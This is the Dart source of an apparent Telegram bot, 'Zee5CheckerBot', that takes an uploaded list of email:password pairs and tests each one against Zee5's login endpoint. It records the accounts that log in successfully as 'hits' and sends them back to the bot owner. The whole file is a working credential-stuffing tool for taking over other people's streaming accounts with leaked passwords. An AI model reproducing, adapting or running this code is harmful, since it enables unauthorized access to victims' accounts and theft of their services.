// Zee5CheckerBot
// Copyright (C) 2021 Akash Pattnaik
//
// This file is a part of < https://github.com/BLUE-DEVIL1134/Zee5CheckerBot/ >
// PLease read the GNU Affero General Public License in
// <https://github.com/BLUE-DEVIL1134/Zee5CheckerBot/blob/main/LICENSE/>.

// InBuilt
import 'dart:convert' show LineSplitter, json;
import 'dart:io' as io;

// Packages
import 'package:teledart/model.dart';
import 'package:teledart/teledart.dart' show TeleDart;
import 'package:http/http.dart' as http;

void checker(TeleDart bot, TeleDartMessage event, String UserId, List _, io.File HitsDB, String token) async {
  if (event.text == '/start' || event.text == '/source' || event.text == '/commands' || event.text == '/sysinfo' || event.text == '/check') {
    return;
  } else {
      if (event.from!.id.toString() == UserId && event.document != null) {
        if (event.document!.file_name!.endsWith('.txt')) {
          var file = await http.post(
            Uri.parse('https://api.telegram.org/bot${token}/getFile'),
            body: {'file_id': '${event.document!.file_id}'},
          );
          var path = json.decode(file.body);
          if (path['result']['file_path'] != '' || path['result']['file_path'] != null) {
            var data = await http.get(
              Uri.parse('https://api.telegram.org/file/bot${token}/${path['result']['file_path']}'),
            );
            final combos = LineSplitter().convert(data.body);
            await event.reply('Recieved');
            var Owner = await bot.telegram.getChatMember(UserId, int.parse(UserId));
            for (var i in combos) {
              if (!i.contains(':')) {
                await event.reply('Invalid Combos');
              } else {
                try {
                  var mail = i.split(':')[0];
                  var pass = i.split(':')[1];
                  var req = await http.get(
                    Uri.parse('https://userapi.zee5.com/v1/user/loginemail?email=${mail}&password=${pass}'),
                  );
                  if (req.body.startsWith('{"token":"')) {
                    await event.reply('*Hit*\n`${i}`', parse_mode: 'markdown');
                    HitsDB.writeAsStringSync('\n${i}', mode: io.FileMode.append);
                    _.add(i);
                  }
                } catch (error) {
                  await event.reply('Invalid Combos\nGot An Error At - `${i}`', parse_mode: 'markdown');
                }
              }
            }
            await event.reply(
              '*Completed !*\n_This Message States That The Combo Check Is Completed..._\n\n*If *`Hits` *Were Found, It Would Have Been Sent.*',
              parse_mode: 'markdown',
            );
            if (_.length > 2) {
              await event.replyDocument(
                HitsDB,
                caption: '<b>For <a href="${"https://tg://${Owner.user.id}"}">${Owner.user.first_name}</a> By @AKASH_AM1 </b>',
                parse_mode: 'html',
                withQuote: true,
                reply_markup: ReplyMarkup.fromJson(InlineKeyboardButton(text: 'Button', url: 'https://github.com/BLUE-DEVIL1134').toJson())
              );
            }
          } else {
            await event.reply('Please Resend The File.');
          }
          return;
        } else {
          try {
            var extension = event.document!.file_name!.split('.')[1];
            await event.reply('Seriously ? You Keep Combos In A `.${extension}` File...\n*Please Send A* `.txt` *File*', parse_mode: 'markdown');
          } catch (error) {
            var extension = 'ExtensionLess';
            await event.reply('Seriously ? You Keep Combos In A `.${extension}` File...\n*Please Send A* `.txt` *File*', parse_mode: 'markdown');
          }
        }
      }
      else {
        var list = ['./src/spam', './src/spam2', './src/spam3', './src/spam4', './src/super_spam', './src/spam5', './src/spam6'];
        await event.replySticker(
          io.File('${(list..shuffle()).first}.webp')
        );
        await event.reply(
          '<b>Don\'t Spam Here..</b>\nA Better Place To Spam Is '
          '<a href="https://t.me/${event.from!.username}">Here</a>',
          parse_mode: 'html',
          withQuote: false,
          disable_web_page_preview: false,
        );
      }
    }
}